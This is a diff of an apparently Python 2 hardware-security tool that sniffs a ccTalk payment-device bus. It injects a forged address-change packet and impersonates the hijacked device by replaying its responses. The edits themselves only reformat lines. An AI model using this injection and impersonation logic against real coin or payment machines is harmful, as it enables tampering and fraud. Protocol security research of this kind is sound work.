@@ -76,9 +76,14 @@ class ccResponder(threading.Thread):
         Responds to a request
         """
         if request.payload.header in self.responses.keys():
-            resp = ccTalkMessage(header=0, source=self.address, destination=request.source, payload=self.responses[request.payload.header])
+            resp = ccTalkMessage(header=0, 
+                    source=self.address, 
+                    destination=request.source, 
+                    payload=self.responses[request.payload.header])
         else:
-            resp = ccTalkMessage(header=0, source=self.address, destination=request.source)
+            resp = ccTalkMessage(header=0, 
+                    source=self.address, 
+                    destination=request.source)
         for byte in resp.raw():
             ser.write(byte)
             ser.flush()
@@ -104,8 +109,8 @@ class ccResponder(threading.Thread):
 
 class serialTimerReader(threading.Thread):
     """
-    This class defines a thread that grabs data on a ccTalk bus as well as the blank
-    times to determine if injection is possible
+    This class defines a thread that grabs data on a ccTalk 
+    bus as well as the blank times to determine if injection is possible
     """
 
     def __init__(self):
@@ -175,7 +180,10 @@ def injectMessage(header, data='', source=1, destination=2):
     """
     Waits for a silence on the ccTalk bus, then sends a packet"
     """
-    request = ccTalkMessage(source=source, destination=destination, header=header, payload=data)
+    request = ccTalkMessage(source=source, 
+            destination=destination, 
+            header=header, 
+            payload=data)
     sent=False
     while not sent:
         bytesToRead = ser.inWaiting()
@@ -190,14 +198,24 @@ def injectMessage(header, data='', source=1, destination=2):
 if __name__ == '__main__':
 
     parser = OptionParser()
-    parser.add_option("-i", "--interface", help="Serial port to use", metavar="DEVICE", dest="serPort")
-    parser.add_option("-b", "--bus-pirate", help="Use this switch to tell the serial port is a bus pirate", dest="busPirate", action="store_true", default=False)
-    parser.add_option("-a", "--address", type="int", help="Address of the device sending the address change request", metavar="ADDRESS", dest="address", default=1)
-    parser.add_option("-s", "--source", type="int", help="Source address of the device to hijack", metavar="SOURCE", dest="source", default=2)
-    parser.add_option("-d", "--destination", type="int", help="Destination address of the device to hijack", metavar="DESTINATION", dest="destination", default=42)
-    parser.add_option("-t", "--time", help="Time to listen for packets", type="int", metavar="TIME", dest="sniffTime", default=5)
-    parser.add_option("-r", "--read", help="File to read responses from", metavar="FILE", dest="inputFile")
-
+    parser.add_option("-i", "--interface", help="Serial port to use", 
+            metavar="DEVICE", dest="serPort")
+    parser.add_option("-b", "--bus-pirate", 
+            help="Use this switch to tell the serial port is a bus pirate", 
+            dest="busPirate", action="store_true", default=False)
+    parser.add_option("-a", "--address", type="int", 
+            help="Address of the device sending the address change request", 
+            metavar="ADDRESS", dest="address", default=1)
+    parser.add_option("-s", "--source", type="int", 
+            help="Source address of the device to hijack", metavar="SOURCE", 
+            dest="source", default=2)
+    parser.add_option("-d", "--destination", type="int", 
+            help="Destination address of the device to hijack", metavar="DESTINATION", 
+            dest="destination", default=42)
+    parser.add_option("-t", "--time", help="Time to listen for packets", type="int", 
+            metavar="TIME", dest="sniffTime", default=5)
+    parser.add_option("-r", "--read", help="File to read responses from", 
+            metavar="FILE", dest="inputFile")
     (options, args) = parser.parse_args()
 
     if options.serPort is None:
@@ -234,11 +252,8 @@ if __name__ == '__main__':
 
             print "[*] Time slots found, ready for injection"
 
-            # We instanciate the responder to load the responses
             responder = ccResponder(int(options.source))
-
             ccPkts=[]
-
             # If input file is provided, read responses from there
             if options.inputFile is not None:
                 try:
@@ -248,7 +263,6 @@ if __name__ == '__main__':
                     ccPkts += parseMessages(data)[1]
                 except:
                     print "[!] Data file error"
-
             # Read responses from the initial sniff
             ccPkts += parseMessages(reader.getData())[1]
 
@@ -264,7 +278,10 @@ if __name__ == '__main__':
 
             # Send an address change request to the device
             print "[*] Changing device address to "+str(options.destination)
-            injectMessage( header=251, data=chr(int(options.destination)), source=int(options.address), destination=int(options.source))
+            injectMessage(header=251, 
+                    data=chr(int(options.destination)), 
+                    source=int(options.address), 
+                    destination=int(options.source))
 
             #Totally flush the input buffer before starting replies
             ser.flushInput()
@@ -302,7 +319,10 @@ if __name__ == '__main__':
 
 
     print "[*] Restoring device @ " + str(options.destination) + " to " + str(options.source)
-    injectMessage( header=251, data=chr(int(options.source)), source=int(options.address), destination=int(options.destination))
+    injectMessage(header=251, 
+            data=chr(int(options.source)), 
+            source=int(options.address), 
+            destination=int(options.destination))
 
     if options.busPirate:
         leaveBitBang()
